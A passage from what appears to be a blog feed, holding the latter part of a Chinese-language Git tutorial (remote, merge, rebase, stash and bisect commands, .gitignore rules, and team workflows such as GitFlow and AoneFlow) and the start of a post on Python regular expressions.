src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/2018030919282196.png"></p><ul><li>git remote：操作远程仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git remote  <span class="hljs-comment"># 查看关联的远程仓库名称</span><br>git remote -v  <span class="hljs-comment"># 查看关联的远程仓库的详细信息</span><br>git remote add &lt;shortname&gt; &lt;url&gt;  <span class="hljs-comment"># 关联远程仓库，使用&lt;shortname&gt;指定一个仓库别名（通常为origin）</span><br>git remote rm/remove &lt;shortname&gt;  <span class="hljs-comment"># 删除远程仓库关联</span><br></code></pre></td></tr></table></figure><blockquote><p>远程分支通常写作<code>远程主机名/分支名</code>，如<code>origin/master</code>，保存在<code>./img/Git使用指南/refs/remotes/origin</code>目录下</p></blockquote><ul><li>git fetch：获取远程仓库中的最新版本到本地</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git fetch &lt;远程主机名&gt;  <span class="hljs-comment"># 取回远程更新（所有分支），不改变本地仓库文件</span><br>git fetch &lt;远程主机名&gt; &lt;分支名&gt;  <span class="hljs-comment"># 指定分支</span><br>git fetch origin tag &lt;tagname&gt;  <span class="hljs-comment"># 拉取远程分支的指定版本</span><br></code></pre></td></tr></table></figure><ul><li>git pull：获取远程仓库中的最新版本并merge到本地</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 分支拉取/推送顺序的写法是&lt;来源地&gt;:&lt;目的地&gt;</span><br>git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;<br>git pull origin feature:dev  <span class="hljs-comment"># 从远程库拉取分支，进行合并</span><br>git pull  <span class="hljs-comment"># 快速拉取（等同于git fetch + git merge）</span><br>git pull -p  <span class="hljs-comment"># 拉取时在本地删除远程已经删除的分支</span><br>git pull --rebase &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;  <span class="hljs-comment"># 采用rebase模式</span><br></code></pre></td></tr></table></figure><blockquote><p>git pull = git fetch + git merge</p></blockquote><ul><li>git push：推送本地修改到远程仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;<br>git push origin dev:feature  <span class="hljs-comment"># 向远程库推送自己的修改（如果远程分支不存在，则新建）</span><br>git push origin feature  <span class="hljs-comment"># 当前分支与上游分支同名时可省略</span><br>git push  <span class="hljs-comment"># 关联后可直接使用快速推送（推送当前分支，并且当前分支与上游分支同名）</span><br>git push -u/--set-upstream origin &lt;本地分支名&gt;  <span class="hljs-comment"># 推送时添加远程关联</span><br>git push origin --delete &lt;远程分支名&gt;  <span class="hljs-comment"># 删除远程分支</span><br><span class="hljs-comment"># 撤销远程提交：</span><br>git reset --hard &lt;commit&gt;<br>git push origin &lt;本地分支名&gt; --force  <span class="hljs-comment"># 强制覆盖远程版本</span><br></code></pre></td></tr></table></figure><h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><ul><li>git merge：合并分支</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/2926d47044d764c6b291f07461b9a2d0_720w.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git merge &lt;branch&gt; -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 合并指定分支到当前分支</span><br>git merge &lt;branch&gt; --no-ff -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 不使用Fast-forward模式进行合并</span><br>git merge --abort  <span class="hljs-comment"># 放弃合并（发生冲突时）</span><br></code></pre></td></tr></table></figure><ul><li>git rebase：变基（衍合分支）</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/7e2f258b5e5417cda3f7ff2bd0fc01c8_720w.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git rebase &lt;branch&gt; -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 衍合指定分支到当前分支</span><br>git rebase &lt;branch&gt; --no-ff -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 不使用Fast-forward模式进行合并</span><br>git rebase --<span class="hljs-built_in">continue</span>  <span class="hljs-comment"># 解决代码冲突后，继续进行rebase</span><br>git rebase --abort  <span class="hljs-comment"># 放弃衍合（发生冲突时）</span><br></code></pre></td></tr></table></figure><blockquote><p>merge和rebase的区别：</p><p>git merge会将两个分支的最新一次提交进行合并，发生冲突并解决冲突后，执行<code>git add</code>和<code>git commit</code>，最终会产生一个新的commit。合并的结果为非线性，但只用解决一次冲突。（快进式合并的合并结果为线性，且不产生任何新的commit）</p><p>git rebase会把当前分支的commit放到公共分支的最后面（变基），发生冲突并解决冲突后，执行<code>git add</code>和<code>git rebase --continue</code>，不会产生额外的commit，会改变最近一次commit的hash值。合并的结果呈现为线性，但看不到完整的历史脉络（不要在公共分支使用rebase，否则容易破坏其他人的commit记录），同时rebase的冲突需要一个个解决（把commit打散成patch），一次rebase可能要解决多次冲突。</p></blockquote><ul><li>git cherry-pick：择优挑选</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git cherry-pick &lt;commit1&gt; &lt;commit2&gt;  <span class="hljs-comment"># 将指定的提交转移到当前分支，并在当前分支产生一个新的提交</span><br>git cherry-pick &lt;commit1&gt;..&lt;commit2&gt;  <span class="hljs-comment"># 将1~2之间的提交都转移到当前分支</span><br>git cherry-pick &lt;branch&gt;  <span class="hljs-comment"># 将指定分支的最近一次提交，转移到当前分支</span><br>git cherry-pick --<span class="hljs-built_in">continue</span>  <span class="hljs-comment"># 解决代码冲突后，继续进行cherry-pick</span><br>git cherry-pick --abort  <span class="hljs-comment"># 放弃合并（发生冲突时）</span><br></code></pre></td></tr></table></figure><blockquote><p>使用merge合并另一个分支的所有变动，使用cherry-pick合并任意分支中的部分提交。</p></blockquote><h3 id="冲突处理"><a href="#冲突处理" class="headerlink" title="冲突处理"></a>冲突处理</h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210115183051717.png"></p><h2 id="Git-进阶"><a href="#Git-进阶" class="headerlink" title="Git 进阶"></a>Git 进阶</h2><h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><ul><li>git tag：标签管理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">git tag  <span class="hljs-comment"># 查看所有标签</span><br>git tag &lt;tagname&gt; [&lt;commit&gt;]  <span class="hljs-comment"># 创建标签，默认值是HEAD</span><br>git tag -a &lt;tagname&gt; -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 添加标签信息</span><br>git tag -d &lt;tagname&gt;  <span class="hljs-comment"># 删除标签</span><br><span class="hljs-comment"># 推送标签（tag）：</span><br>git push origin &lt;tagname&gt;  <span class="hljs-comment"># 推送一个本地标签</span><br>git push origin --tags  <span class="hljs-comment"># 推送全部未推送过的本地标签</span><br>git push origin :refs/tags/&lt;tagname&gt;  <span class="hljs-comment"># 删除远程标签</span><br></code></pre></td></tr></table></figure><blockquote><p>tag实际是一个指向commit的引用，保存在<code>./img/Git使用指南/refs/tags/</code>目录下，可以使用<code>git checkout &lt;tagname&gt;</code>检出</p></blockquote><ul><li>git stage：暂存</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git stash  <span class="hljs-comment"># 保存当前工作区和暂存区的状态到git栈</span><br>git stash list  <span class="hljs-comment"># 查看git栈中的文件列表</span><br>git stash show  <span class="hljs-comment"># 查看git栈中的文件改动</span><br>git stash pop [stash@&#123;<span class="hljs-variable">$num</span>&#125;]  <span class="hljs-comment"># 从git栈中恢复一个stash（默认为最近的）</span><br>git stash apply [stash@&#123;<span class="hljs-variable">$num</span>&#125;]  <span class="hljs-comment"># 从git栈中恢复一个stash（不删除栈中的内容）</span><br>git stash branch &lt;branch&gt; [stash@&#123;<span class="hljs-variable">$num</span>&#125;]  <span class="hljs-comment"># 基于stash创建分支</span><br>git stash clear  <span class="hljs-comment"># 清空git栈中所有内容</span><br></code></pre></td></tr></table></figure><ul><li>git blame：文件追溯</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git blame &lt;filename&gt;  <span class="hljs-comment"># 查看文件每一行的内容作者</span><br>git blame &lt;filename&gt; -L a,b  <span class="hljs-comment"># 查看文件第a行到第b行之间的内容作者</span><br></code></pre></td></tr></table></figure><ul><li><a href="http://www.ruanyifeng.com/blog/2018/12/git-bisect.html">git bisect</a>：二分查找</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git bisect start &lt;lastCommit&gt; &lt;firstCommit&gt; <span class="hljs-comment"># 指定差错范围（自动切换回之前的版本）</span><br><span class="hljs-comment"># 例：git bisect start HEAD 4d83cf</span><br>git bisect good  <span class="hljs-comment"># 正常</span><br>git bisect bad  <span class="hljs-comment"># 异常</span><br>git bisect reset  <span class="hljs-comment"># 退出查错，回到最近一次的提交</span><br></code></pre></td></tr></table></figure><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/bg2018122402.png"></p><h3 id="文件忽略"><a href="#文件忽略" class="headerlink" title="文件忽略"></a>文件忽略</h3><ol><li>使用<code>.gitignore</code>忽略不希望添加到版本库的文件。</li><li><code>.gitignore</code>文件可以放在任何目录。</li><li><code>.gitignore</code>文件<a href="https://github.com/github/gitignore">模板</a></li><li>忽略语法：<ol><li><code>.gitignore</code>文件中的空行或者以井号（#）开始的行会被忽略。</li><li>可以使用通配符：星号<code>*</code>代表任意多字符，问号<code>?</code>代表一个字符，方括号<code>[abc]</code>代表可选字符。</li><li>如果名称的最前面是一个路径分隔符<code>/</code>，表明要忽略的文件在此目录下，而非子目录的文件。</li><li>如果名称的最后面是一个路径分隔符<code>/</code>，表明要忽略的是整个目录，不忽略同名文件。</li><li>通过在名称的最前面添加一个感叹号<code>!</code>，代表不忽略。</li></ol></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 示例：</span><br><span class="hljs-comment"># 这是注释行 —— 被忽略</span><br>*.a       <span class="hljs-comment"># 忽略所有以 .a 为扩展名的文件</span><br>!lib.a    <span class="hljs-comment"># 但是 lib.a 文件或者目录不要忽略（即使前面设置了对 *.a 的忽略）</span><br>cache     <span class="hljs-comment"># 忽略所有名称为 cache 的目录和文件</span><br>/TODO     <span class="hljs-comment"># 只忽略当前目录下的 TODO 文件，子目录的 TODO 文件不忽略</span><br>build/    <span class="hljs-comment"># 忽略所有 build/ 目录下的文件</span><br>doc/*.txt <span class="hljs-comment"># 忽略文件如 doc/notes.txt，但是文件如 doc/server/arch.txt 不被忽略</span><br></code></pre></td></tr></table></figure><h3 id="常用指令速查"><a href="#常用指令速查" class="headerlink" title="常用指令速查"></a>常用指令速查</h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/011500266295799.jpg"></p><h2 id="Git-协同模型"><a href="#Git-协同模型" class="headerlink" title="Git 协同模型"></a>Git 协同模型</h2><h3 id="Atlassian：什么是成功的Git-Workflow？"><a href="#Atlassian：什么是成功的Git-Workflow？" class="headerlink" title="Atlassian：什么是成功的Git Workflow？"></a><a href="https://www.atlassian.com//img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/tutorials/comparing-workflows">Atlassian</a>：什么是成功的Git Workflow？</h3><p>在评估团队的工作流程时，最重要的是要考虑团队的文化。工作流程应该能够提高团队工作的效率，而不是成为限制生产力的负担。评估Git Workflow时应考虑以下几点：</p><ul><li>这个Workflow是否与团队规模相匹配？</li><li>使用这个Workflow是否容易撤销失误和修复错误？</li><li>使用这个Workflow是否会给团队带来新的不必要的认知开销？</li></ul><h3 id="Centralized-Workflow"><a href="#Centralized-Workflow" class="headerlink" title="Centralized Workflow"></a>Centralized Workflow</h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210104195816154.png"></p><h4 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-2e8b31d4cef104ca.png"></p><ol><li><strong>管理员</strong>初始化中央存储库（裸存储库） — <code>git init --bare</code></li><li><strong>开发人员</strong>从远程仓库克隆工程到本地仓库 — <code>git clone</code></li><li>在本地仓库编辑文件和提交更新 — <code>git add </code> 和 <code>git commit</code></li><li>Fetch远程仓库已更新的commit到本地仓库，并rebase到已更新的commit的上面 — <code>git fetch</code> 和 <code>git rebase</code> 或 <code>git pull --rebase</code></li><li>Push本地master分支到远程master分支 — <code>git push</code></li></ol><h4 id="处理冲突"><a href="#处理冲突" class="headerlink" title="处理冲突"></a>处理冲突</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-c35cfff72407266e.png"></p><ul><li>开发人员在执行第四步时，本地提交与远程提交可能会发生冲突，git会暂停rebase过程，需要使用 <code>git status</code> 和 <code>git add</code> 来手动解决冲突。</li></ul><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ol><li>适合从SVN过渡到分布式版本控制系统，无需改变已有的工作流程和团队协作方式。</li><li>简单、直接，完美的线性提交记录。</li><li>适合小型团队。</li></ol><h3 id="Feature-Branch-Workflow"><a href="#Feature-Branch-Workflow" class="headerlink" title="Feature Branch Workflow"></a>Feature Branch Workflow</h3><p>Feature Branch Workflow是对Centralized Workflow的逻辑扩展，其主要思想就是在开发每个功能时都应该创建<strong>一个独立的分支</strong>而不在master分支中进行。由于每个分支是独立且互不影响，这就意味着master分支中不会包含broken code，对持续集成环境很有帮助。</p><h4 id="工作模式-1"><a href="#工作模式-1" class="headerlink" title="工作模式"></a>工作模式</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-131d038fa47a30f6.png"></p><ol><li>仍然使用远程仓库和master分支记录官方工程</li><li>开发者为每个功能或问题创建一个单独的feature分支 — <code>git checkout -b</code></li><li>在本地仓库编辑文件和提交更新 — <code>git add </code> 和 <code>git commit</code></li><li>将feature分支推送到远程仓库 — <code>git push</code></li><li>发送pull request来请求管理员是否将feature分支（远程）合并到master分支（远程）</li></ol><h4 id="Pull-Request"><a href="#Pull-Request" class="headerlink" title="Pull Request"></a>Pull Request</h4><ul><li>开发者当完成一项功能后，不会立即将其合并到master分支，而是发起一个pull request请求。</li><li>其他的团队成员接收到请求，可以审查、讨论和修改代码（Code Review）。</li><li>项目管理员合并新增的feature分支到master分支，关闭pull request。</li></ul><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ol><li>每个功能都创建一个独立的分支，易于持续集成环境。</li><li>Pull Request机制。</li><li>是一种非常灵活的开发方式。</li></ol><h3 id="TrunkBased-Workflow"><a href="#TrunkBased-Workflow" class="headerlink" title="TrunkBased Workflow"></a>TrunkBased Workflow</h3><p>Trunk based development是<a href="https://paulhammant.com/2013/04/05/what-is-trunk-based-development/">Paul Hammant</a>在2013年提出的模型，是SVN的基本开发模式。TBD模型由单个master分支（trunk）和许多release分支组成，所有开发都在trunk上进行，使用衍生出的release分支交付。</p><h4 id="工作模式-2"><a href="#工作模式-2" class="headerlink" title="工作模式"></a>工作模式</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/what_is_trunk.jpg"></p><ul><li>在trunk分支开发，开发完成或hotfix后衍生出release分支发布。</li><li>release分支不可修改，每一次更新，都有对应的版本号标签。</li></ul><p><strong>小规模团队：</strong>直接在trunk上进行开发。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/1713192-20190905112552397-1416856692.png" alt="Simple TrunkBased"></p><p><strong>大规模团队：</strong>从trunk衍生出短期的feature分支进行开发，开发完成后合并回trunk。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/1713192-20190905112630354-1899396857.png" alt="Complex TrunkBased"></p><h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ol><li><p>模型简单</p></li><li><p>易于持续集成</p></li></ol><h3 id="GitFlow-Workflow"><a href="#GitFlow-Workflow" class="headerlink" title="GitFlow Workflow"></a>GitFlow Workflow</h3><p><a href="http://nvie.com/posts/a-successful-git-branching-model/">GitFlow Workflow</a>由Vincent Driessen在2010年首次提出并广受欢迎，它定义了围绕项目生命周期设计的严格分支模型。核心思想与Feature Branch Workflow类似，但是给特定的分支赋予了非常具体的角色，并定义它们应如何以及何时进行交互。</p><p>具体而言有四种分支：</p><ul><li>Main Branches</li><li>Feature Branches</li><li>Release Branches</li><li>Hotfix Branches</li></ul><h4 id="工作模式-3"><a href="#工作模式-3" class="headerlink" title="工作模式"></a>工作模式</h4><h5 id="Main-Branches"><a href="#Main-Branches" class="headerlink" title="Main Branches"></a>Main Branches</h5><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-485066c088e41b1a.png"></p><ul><li><strong>master分支：</strong>用来保存正式的、可在生产环境中部署的代码，每一次更新，都有对应的版本号标签。</li><li><strong>develop分支：</strong>从master分支派生，是每次迭代版本时的共有开发分支。</li></ul><h5 id="Feature-Branches"><a href="#Feature-Branches" class="headerlink" title="Feature Branches"></a>Feature Branches</h5><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-ba97394474c5dd8b.png"></p><ul><li><strong>feature分支：</strong>用来开发一项新的软件功能。</li><li>develop分支可以同时衍生出多个feature分支。</li><li>当一个feature分支开发完成后，将这个分支上的代码变更合并至develop分支。</li><li>feature分支应该永远不与master分支直接交互。</li></ul><h5 id="Release-Branches"><a href="#Release-Branches" class="headerlink" title="Release Branches"></a>Release Branches</h5><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-8bd4aa2579dcf341.png"></p><ul><li><strong>release分支：</strong>用来存放准备发布的代码。</li><li>当develop分支开发完成后，可以从develop衍生出一个release分支。</li><li>release分支中不应该添加任何新功能，应仅包含测试、错误修复、文档生成及其他面向发布的任务。</li><li>测试中出现的bug，统一在release分支下进行修改，并推送至远程分支。</li><li>修改内容必须合并回develop分支，上线时从release分支合并到master分支。</li><li>合并后的master应该被标记一个新的版本号。</li></ul><h5 id="Hotfix-Branches"><a href="#Hotfix-Branches" class="headerlink" title="Hotfix Branches"></a>Hotfix Branches</h5><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-588644ba9ef509bc.png"></p><ul><li><strong>Hotfix分支：</strong>用来快速给已发布产品修复bug或微调功能。</li><li>从master分支直接衍生出来。</li><li>完成bug修复后，合并至master分支以及develop分支。</li><li>合并后的master应该被标记一个新的版本号。</li></ul><h4 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210105165447478.png"></p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/git-model@2x.png"></p><h4 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h4><ol><li>为管理大型项目提供了一个强大的框架，可用于大规模的团队协作场景。</li><li>非常适合有计划发布周期的项目，可帮助实施持续交付下的DevOps最佳实践。</li></ol><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>企业级开发，大型团队，敏捷要求相对较低（分支存活时间长短不一、合并繁琐、依赖管理）。</p><h3 id="AoneFlow-Workflow"><a href="#AoneFlow-Workflow" class="headerlink" title="AoneFlow Workflow"></a>AoneFlow Workflow</h3><p>AoneFlow只使用三种分支类型：<strong>master分支、feature分支、release分支</strong>，以及三条基本规则。</p><h4 id="工作模式-4"><a href="#工作模式-4" class="headerlink" title="工作模式"></a>工作模式</h4><p><strong>规则一：开始工作前，从master分支创建feature分支。</strong></p><p>AoneFlow的feature分支基本借鉴GitFlow，每当开始一项新的工作时，从master分支衍生出一条feature分支（通常以<code>feature/</code>前缀命名），然后在这个分支上提交代码修改。每个工作项对应一个feature分支，所有的修改都不允许直接提交到master分支。</p><ul><li>master分支长期存在（项目的整个生命周期），由项目主要负责人管理。</li><li>feature分支作为临时分支，用于开发的具体功能特性或修复bug，在功能完成后删除。</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/bVbgRBo.png" alt="AoneFlow1"></p><p><strong>规则二：通过合并feature分支，形成release分支。</strong></p><p>从master分支上衍生出一条release分支（通常以<code>release/</code>前缀命名），将所有本次要集成或发布的feature分支依次合并过去。</p><ul><li>GitFlow：feature -&gt; develop -&gt; release</li><li>TrunkBased：master -&gt; release</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/bVbgRBD.png" alt="AoneFlow2"></p><p>release分支的用途可以很灵活，通常将每条release分支与具体的环境相对应，比如release/test对应测试环境，release/prod对应线上正式环境等等。</p><ul><li>release分支既可以为长期分支也可以为短期分支（存在于一个或者多个版本之间），由测试负责人管理。</li></ul><p><strong>规则三：发布到线上正式环境后，合并相应的release分支到master分支，在master分支上添加标签，同时删除该release分支关联的feature分支。</strong></p><p>当一条release分支完成线上正式环境的部署后，为了避免在代码仓库里堆积大量feature分支，还应该清理掉已经上线部分的feature分支。与GitFlow相似，master分支上的最新版本始终与线上版本一致，如果要回溯历史版本，只需在master分支上找到相应的版本标签即可。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/bVbgRBI.png" alt="AoneFlow3"></p><p><strong>其他：</strong>对于hotfix，可以创建一条新的release分支，对应线上环境。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">开发人员A从Master拉取代码生成feature_20210101_A_login<br>开发人员B从Master拉取代码生成feature_20210101_B_register<br><br>测试负责人Y从Master拉取release/test<br>开发人员A提交Pull Request PR1<br>开发人员B提交Pull Request PR2<br><br>开发负责人F和开发人员C评审PR1 PR2，评审通过<br><br>测试负责人Y合并代码到release/test（如果遇到合并冲突，由开发人员处理）<br>测试人员X对release/test中的代码进行测试<br>完成测试后对比Master是否比release/test时有更新，如果没有则直接使用release/test构建上线申请<br>否则从最新Master拉取分支release/prod，合并相关PR并进行回归测试<br></code></pre></td></tr></table></figure><h4 id="优点-4"><a href="#优点-4" class="headerlink" title="优点"></a>优点</h4><ol><li>每个功能都创建一个独立的分支，易于持续集成环境。</li><li>release分支的feature组成是动态的，易于调整需求或增删功能。</li><li>release分支之间是松耦合的，可以有多个集成环境分别进行不同的feature组合的集成测试。</li></ol><h3 id="Forking-Workflow"><a href="#Forking-Workflow" class="headerlink" title="Forking Workflow"></a>Forking Workflow</h3><p>Forking Workflow与以上讨论的工作流程不同，它不是多个开发者共享一个远程仓库，而是每个开发者都拥有一个独立的服务端存储库。也就是说每个contributor都有两个仓库：本地私有的仓库和远程共享的仓库。</p><p>Forking Workflow这种工作流主要好处就是每个开发者都拥有自己的远程仓库，可以将提交的commits推送到自己的远程仓库，但只有工程维护者才有权限push提交的commits到官方仓库，其他开发者在没有授权的情况下不能push。Github很多开源项目都是采用Forking Workflow工作流。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-9819c933dc5873fb.png"></p><h4 id="工作模式-5"><a href="#工作模式-5" class="headerlink" title="工作模式"></a>工作模式</h4><ol><li>项目创建者在服务器上有一个官方的存储仓库。</li><li>开发者fork官方仓库来创建它的拷贝，然后存放在自己的服务器上。</li><li>当开发者准备好发布本地的commit时，他们push commit到他们自己的公共仓库。</li><li>在自己的公共仓库发送一个pull request到官方仓库。</li><li>维护者pull贡献者的commit到他自己的本地仓库。</li><li>审查代码确保它不会破坏工程，合并它到本地仓库的master分支。</li><li>push master分支到服务器上的官方仓库。</li><li>其他开发者应同步官方仓库。</li></ol><h4 id="优点-5"><a href="#优点-5" class="headerlink" title="优点"></a>优点</h4><ol><li>便于多人协作和独立开发。</li><li>是开源项目的理想工作流程。</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://progit.bootcss.com/">Pro Git（第二版）</a></li><li><a href="http://www.worldhello.net/got/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/index.html">Git 权威指南</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 正则表达式</title>
    <link href="/post/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/post/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>正则表达式（Regular Expression，常简写为regex、regexp或re），是一种简练地描绘一组字符的方式，可用于高效、精确地执行字符串检索、替换等任务。</p><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th>语法</th><th>描述</th><th>语法</th><th>描述</th><th>语法</th><th>描述</th><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>[abc]</td><td>单个字符：a或b或c</td><td>[^abc]</td><td>a/b/c以外的单个字符</td><td>[a-zA-Z0-9]</td><td>范围内的字符</td><td>.</td><td>任意字符（除\n）</td></tr><tr><td>\s</td><td>空白符（等价于[ \f\n\r\t\v]）</td><td>\S</td><td>非空白符</td><td>\d</td><td>数字字符（十进制）</td><td>\D</td><td>非数字字符</td></tr><tr><td>\w</td><td>单词（字母，数字，下划线，中文）</td><td>\W</td><td>非单词</td><td>\b</td><td>单词边界</td><td>\B</td><td>非单词边界</td></tr><tr><td>^ \A</td><td>开头</td><td>$ \Z</td><td>结尾</td><td>(…)</td><td>分组</td><td>(a|b)</td><td>择一匹配：a或b</td></tr><tr><td>a*</td><td>重复0次或多次</td><td>a+</td><td>重复1次或多次</td><td>a?</td><td>重复0次或1次</td><td>a{n}</td><td>重复n次</td></tr><tr><td>a{n,}</td><td>重复n次或多次</td><td>a{n,m}</td><td>重复n到m次</td><td>?</td><td>非贪婪匹配</td><td>(?:abc)</td><td>非捕获分组</td></tr><tr><td>(?=abc)</td><td>正向匹配abc</td><td>(?!abc)</td><td>正向不匹配abc</td><td>\xhh</td><td>十六进制hh字符</td><td>\uhhhh</td><td>十六进制hhhh字符</td></tr><tr><td>\u{hhhh}</td><td>十六进制hhhh字符（设置u标志）</td><td>(?#comment)</td><td>注释</td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><ul><li>i - IgnoreCase：不区分大小写</li><li>m - MultiLine：多行匹配</li><li>s - DotAll：<code>.</code>匹配所有字符（包括<code>\n</code>）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 